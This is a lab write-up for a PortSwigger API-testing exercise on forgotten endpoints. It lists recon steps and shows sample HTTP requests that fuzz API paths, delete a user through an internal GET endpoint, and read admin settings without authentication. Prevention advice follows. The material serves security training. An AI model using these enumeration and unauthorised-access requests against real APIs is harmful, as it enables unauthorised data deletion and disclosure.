# API Testing - Unused Endpoints

## Lab Link
https://portswigger.net/web-security/api-testing/unused-api-endpoints

## Vulnerability Type
API Enumeration / Information Disclosure

## Difficulty
Easy-Medium

## Vulnerability Theory
APIs often have endpoints that:
- Are no longer used but still exist
- Were created for testing purposes and not removed
- Provide alternative access to sensitive functions
- Lack proper access controls
- Bypass frontend validation

These endpoints may expose data or functionality that isn't available through the main UI.

## Recon & Discovery Process
1. Intercept API requests in Burp
2. Map all API endpoints discovered
3. Review API documentation (if available)
4. Fuzz common API path patterns:
   - `/api/v1/`, `/api/v2/`
   - `/api/admin/`, `/api/debug/`
5. Check for backup versions: `/api/users/backup`
6. Test HTTP methods: GET, POST, PUT, DELETE, PATCH
7. Use tools like APIFuzzer or Postman collections
8. Review JavaScript files for API endpoints

## Step-by-Step Exploitation

### Step 1: Enumerate API Endpoints
**Request (Fuzzing):**
```
GET /api/users/delete HTTP/1.1
Host: target.com
Authorization: Bearer token
```

**Response:**
```
HTTP/1.1 404 Not Found
```

Try alternative paths:
```
GET /api/v1/users/delete
GET /api/admin/users/delete
GET /api/internal/delete
```

### Step 2: Test Discovered Endpoints
**Request (Attempting DELETE via GET):**
```
GET /api/internal/users/delete?id=123 HTTP/1.1
Host: target.com
```

**Response:**
```
HTTP/1.1 200 OK
{"status": "success", "deleted_users": 1}
```

### Step 3: Exploit Access Control Issues
Use the endpoint without proper authorization:
```
GET /api/admin/settings HTTP/1.1
Host: target.com
```

Response reveals admin settings without authentication.

## Root Cause Analysis
1. **Poor API Lifecycle Management**: Old endpoints never removed
2. **Inconsistent Access Controls**: Different auth for same resource
3. **Forgotten Debug Code**: Test endpoints left in production
4. **Lack of API Documentation**: Lost track of endpoints
5. **Inadequate Testing**: Endpoints not tested for security

## Impact
**Severity: Medium-High**
- Unauthorized data access
- Unintended data modification
- Privilege escalation
- Information disclosure

## Prevention
1. Maintain comprehensive API inventory
2. Document all endpoints with lifecycle status
3. Implement consistent authentication/authorization
4. Remove unused endpoints before deployment
5. API monitoring and logging
6. Regular security testing of all endpoints

## Key Lessons
1. APIs are permanent - removing UI access doesn't remove endpoint
2. Endpoint discovery is possible through multiple methods
3. Assume all endpoints accessible unless proven otherwise
4. Test all HTTP methods on every endpoint

---

**Difficulty**: Easy-Medium
**Time Estimate**: 15-20 minutes
